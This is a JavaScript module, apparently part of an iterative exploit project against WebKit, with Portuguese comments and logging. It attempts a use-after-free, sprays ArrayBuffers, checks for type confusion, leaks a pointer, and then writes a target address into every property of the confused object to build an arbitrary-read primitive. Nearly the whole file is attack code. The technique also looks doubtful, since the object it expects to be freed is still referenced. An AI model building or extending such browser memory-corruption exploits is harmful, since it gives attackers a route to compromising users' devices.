// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R67 - Escrita "Shotgun")
// =======================================================================================
// AS TENTATIVAS DE VINCULAÇÃO FALHARAM. ESTA VERSÃO VOLTA AO BÁSICO DO R58 E APLICA
// UMA ESTRATÉGIA DE FORÇA BRUTA AGRESSIVA.
// - FASE 6 (NOVA): "Shotgun Write". Em vez de adivinhar qual propriedade se alinha com o
//   ponteiro de dados do ArrayBuffer, escrevemos o endereço alvo em TODAS as propriedades
//   do objeto confuso. Uma delas tem que funcionar.
// - A verificação na FASE 7 permanece a mesma, procurando o resultado do nosso ataque.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R67_Shotgun_Write";

// ... (Funções auxiliares int64ToDouble, doubleToInt64, triggerGC_Tamed) ...
// (O código completo está no final para clareza)

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R67)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Escrita "Shotgun" (R67) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;

    try {
        // FASES 1-5: A base estável que já funciona.
        logS3("--- FASE 1-3: Provocando UAF ---", "subtest");
        const spray_buffers = [];
        dangling_ref = await triggerUAFAndSpray(spray_buffers);
        logS3("    UAF e Spray concluídos.", "info");

        logS3("--- FASE 4/5: Verificando Confusão de Tipos ---", "subtest");
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
        const leaked_addr = doubleToInt64(dangling_ref.corrupted_prop);
        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
        
        // --- FASE 6: Ataque de Escrita "Shotgun" ---
        logS3("--- FASE 6: Ataque de Escrita 'Shotgun' ---", "subtest");
        const target_address_to_read = new AdvancedInt64(0x0, 0x08000000);
        const target_as_double = int64ToDouble(target_address_to_read);
        const victim_props = Object.keys(createVictimObject()); // Pega todas as chaves do nosso objeto vítima
        
        logS3(`    Escrevendo endereço alvo em TODAS as ${victim_props.length} propriedades do objeto confuso...`, "info");
        for (const prop of victim_props) {
            dangling_ref[prop] = target_as_double;
        }

        // --- FASE 7: Verificação por Força Bruta ---
        logS3("--- FASE 7: Verificando todos os buffers pelo resultado da escrita... ---", "subtest");
        let read_value = null;
        let success = false;
        for (const buf of spray_buffers) {
            try {
                const hacked_view = new DataView(buf);
                const val = hacked_view.getUint32(0, true);
                if (val !== 0) { // Qualquer valor não-nulo é um sucesso potencial
                    logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
                    logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(val)}`, "leak");
                    read_value = val;
                    success = true;
                    break;
                }
            } catch (e) { /* Ignora erros */ }
        }

        if (!success) {
            throw new Error("A escrita 'shotgun' foi realizada, mas nenhum buffer retornou o valor esperado.");
        }

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via Shotgun Write!",
            arb_read_test_value: toHex(read_value)
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
}

// --- Funções Auxiliares ---

function createVictimObject() {
    // Objeto usado tanto para criar o UAF quanto para obter a lista de propriedades para o ataque shotgun
    return {
        prop_a: 0.1, prop_b: 0.2, corrupted_prop: 0.3,
        p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
        p16: 0, p17: 0
    };
}

async function triggerUAFAndSpray(spray_buffers_ref) {
    let dangling_ref = null;
    function createDanglingPointer() {
        function createScope() {
            dangling_ref = createVictimObject();
        }
        createScope();
    }
    
    createDanglingPointer();
    await triggerGC_Tamed();
    
    for (let i = 0; i < 2048; i++) {
        spray_buffers_ref.push(new ArrayBuffer(136));
    }

    await triggerGC_Tamed();
    return dangling_ref;
}

async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}
